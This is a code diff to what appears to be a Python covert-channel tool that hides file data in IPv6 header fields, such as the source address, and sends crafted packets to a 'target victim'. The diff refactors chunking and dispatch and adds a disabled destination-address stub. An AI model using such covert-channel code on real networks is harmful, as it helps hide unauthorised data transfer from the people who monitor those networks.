@@ -1419,9 +1419,9 @@ def transfer_file_ipv6_src_addr(client_sock: socket.socket,
 
     # c) Put data in packet
     packets = []
-    for i in range(0, len(binary_data), 128):  # Change the step size to 128
-        binary_segment = binary_data[i:i + 128].ljust(128, '0')
-        src_addr = ':'.join([binary_segment[j:j + 32] for j in range(0, 128, 32)])  # 32 bits or 4 bytes per chunk
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        src_addr = ':'.join([binary_segment[j:j + 4] for j in range(0, 32, 4)])
         packet = IPv6(dst=dest_ip, src=src_addr) / TCP(dport=dest_port)
         packets.append(packet)
 
@@ -1435,6 +1435,42 @@ def transfer_file_ipv6_src_addr(client_sock: socket.socket,
     # f) Send packets
     for packet in packets:
         send(packet, verbose=0)
+
+
+def transfer_file_ipv6_dest_addr(client_sock: socket.socket,
+                                 dest_ip: str,
+                                 dest_port: int,
+                                 file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    source address field.
+
+    @attention: FUNCTIONALITY DISABLED
+                Changing the destination IP field of the IP header will
+                cause the packets created to be sent out to random IP
+                addresses.
+
+                The target victim will not be able to receive any
+                crafted packets; hence - any covert data.
+
+    @note Bit length
+        The source address field for IPv6 headers is 128 bits (16 bytes)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    print(constants.IPV6_DESTINATION_FIELD_ERROR)
 
 
 def __get_protocol_header_function_map():
@@ -1462,7 +1498,7 @@ def __get_protocol_header_function_map():
         ("IPv6", "Next Header"): transfer_file_ipv6_next_header,
         ("IPv6", "Hop Limit"): transfer_file_ipv6_hop_limit,
         ("IPv6", "Source Address"): transfer_file_ipv6_src_addr,
-        ("IPv6", "Destination Address"): "F()",
+        ("IPv6", "Destination Address"): transfer_file_ipv6_dest_addr,
 
         # c) TCP Handlers
         ("TCP", "Source Port"): "F()",
@@ -1518,32 +1554,26 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
             # Send file name and choices
             sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())
 
-            # If IPv6 header chosen, get IPv6 address and port
-            if constants.IPV6 in choices:
-                dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
-                if dest_ip is None or dest_port is None:
-                    return None
-
             # Find the choice(header/field) in map, get and call the mapped function
             if choices in header_field_function_map:
                 selected_function = header_field_function_map.get(choices)
 
-                # If destination address field chosen
-                if constants.DESTINATION_ADDRESS_FIELD in choices:
-                    __transfer_file_dst_addr_error_handler(choices[1], choices[0])
-                    return None
+                # IPv4 Handlers
+                if constants.IPV4 in choices:
+                    if constants.SOURCE_ADDRESS_FIELD in choices:
+                        selected_function(sock, dest_ip, dest_port, source_port, file_path)
+                    elif selected_function is not None and callable(selected_function):
+                        selected_function(sock, dest_ip, file_path)
 
-                # IPv6 Handlers (Dst. port included for better sniff from the client)
+                # IPv6 Handlers
                 elif constants.IPV6 in choices:
+                    if constants.DESTINATION_ADDRESS_FIELD in choices:
+                        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+                        return None
+
+                    # Get victim IPv6 address and port
+                    dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
                     selected_function(sock, dest_ip, dest_port, file_path)
-
-                # If choice covert with source IP address field
-                elif constants.SOURCE_ADDRESS_FIELD in choices:
-                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
-
-                # Otherwise, run as intended
-                elif selected_function is not None and callable(selected_function):
-                    selected_function(sock, dest_ip, file_path)
 
                 else:
                     print(constants.CALL_MAP_FUNCTION_ERROR)
